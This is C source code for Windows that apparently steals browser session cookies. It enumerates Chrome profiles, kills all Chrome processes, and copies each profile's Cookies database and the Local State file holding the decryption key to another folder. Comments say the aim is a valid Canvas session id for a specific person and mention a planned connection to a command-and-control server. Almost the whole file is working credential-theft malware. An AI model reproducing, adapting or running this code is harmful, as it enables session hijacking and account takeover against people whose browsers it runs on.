#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <shlobj.h>

// Connect to CNC

// Read Chrome cookies CHROME MUST BE CLOSED FIRST BEFORE ACCESSING
// C:\\Users\\lando\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies

/* 
    Iterate through all of the folders
        If they have a Network folder then they have a cookie folder
        For example
        C:\Users\lando\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies
        C:\Users\lando\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies
        etc
    
    Order of steps:
        Get list of all cookies files
        Kill chrome then dump all of the cookies files        
        Next, we need the decrpytion key;  steal the Local\\Google\\Chrome\\User Data\\Local State file
        If all goes to plan you should have a valid canvas session id UNTIL he logs in again

*/

int iterateBaseFolder(char localDataPath[MAX_PATH], char** userProfiles, int* userIndex)
{
    // Iterate through all directories in this directory, if directory contains "Network" directory then we'll throw in on profiles list
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = FindFirstFileA(localDataPath, &FindFileData);

    // Check if there is a problem
    if (hFind == INVALID_HANDLE_VALUE)
        return 1;
    

    // Iterate through directories
    do
    {
        if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            // We've found a directory inside of User Data folder; lets search for a Network folder
            
            // Craft new base folder path
            char newFolderPath[MAX_PATH] = {0};
            strncpy(newFolderPath, localDataPath, 53);
            strncat(newFolderPath, FindFileData.cFileName, 20);

            // Create a seperate string to use with FindFirstFileA while maintaining newFolderPath
            char searchPathString[MAX_PATH] = {0};
            strcpy(searchPathString, newFolderPath);
            strncat(searchPathString, "\\*", 3);

            // Begin searching for the network folder
            WIN32_FIND_DATA iterativeFindFileData;
            HANDLE iterativeHFind = FindFirstFileA(searchPathString, &iterativeFindFileData);
            do
            {
                if (!strcmp(iterativeFindFileData.cFileName, "Network"))
                {
                    // We have discovered a profile; lets add it to the profile list
                    char* discoveredPath = malloc(MAX_PATH + 1);
                    strcpy(discoveredPath, newFolderPath);
                    strncat(discoveredPath, "\\", 1);
                    userProfiles[*userIndex] = discoveredPath;
                    *userIndex = *userIndex + 1;
                }
            }
            while(FindNextFile(iterativeHFind, &iterativeFindFileData) != 0);
        }
    }
    while(FindNextFile(hFind, &FindFileData) != 0);
    return 0;
}

void takeLocalFiles(char** userProfiles, int* userIndex, char rootDirectory[MAX_PATH])
{
    // Iterate through all users and take their Cookies
    for (int i = 0; i < *userIndex; i++)
    {
        // Build cookie path
        char copyPath[MAX_PATH] = {0};
        strcpy(copyPath, userProfiles[i]);
        strncat(copyPath, "Network\\Cookies", 30);


        // Copy file to destination
        char destinationPath[MAX_PATH] = "C:\\Users\\lando\\OneDrive\\Desktop\\Cookies";
        sprintf(destinationPath, "%s%d", destinationPath, i);
        
        printf("Source: %s\nDestination: %s\n", copyPath, destinationPath);
        CopyFile(copyPath, destinationPath, 0);
    }

    // Afterwards dump Local State file
    char copyPath[MAX_PATH] = {0};
    strcpy(copyPath, rootDirectory);
    strncat(copyPath, "Local State", 20);

    char destinationPath[MAX_PATH] = "C:\\Users\\lando\\OneDrive\\Desktop\\Local State";
    printf("Source: %s\nDestination: %s\n", copyPath, destinationPath);
    
    
    CopyFile(copyPath, destinationPath, 0);
}

int main()
{
    /*      Step 1: Find all user profiles      */

    // Buffer that will point to chrome cookies path
    char localDataPath[MAX_PATH];
    char rootDirectory[MAX_PATH];
    
    // Firstly get the User data folder location
    HRESULT getFolderResult = SHGetSpecialFolderPathA(NULL, rootDirectory, CSIDL_LOCAL_APPDATA, 0);
    strcpy(localDataPath, rootDirectory);

    // Get the main directory of chrome
    strncat(localDataPath, "\\Google\\Chrome\\User Data\\*", 48);
    strncat(rootDirectory, "\\Google\\Chrome\\User Data\\", 48);

    // Create buffer to store all user profiles; clear it out
    char** userProfiles = malloc(sizeof(char*)*30);
    memset(userProfiles, 0, sizeof(char*)*30);
    int userIndex = 0;

    if (iterateBaseFolder(localDataPath, userProfiles, &userIndex))
    {
        printf("Invalid Handle Value\n");
        return 1;
    }

    for (int i = 0; i < userIndex; i++)
        printf("%s\n", userProfiles[i]);


    /*      Step2: Kill all instances of chrome and then dump Cookie and Local State files      */
    
    // Kill all instances of chrome
    system("taskkill /im chrome.exe /f");
    takeLocalFiles(userProfiles, &userIndex, rootDirectory);

    // Cleanup
    for (int i = 0; i < userIndex; i++)
        free(userProfiles[i]);
    free(userProfiles);
    

    return 0;
}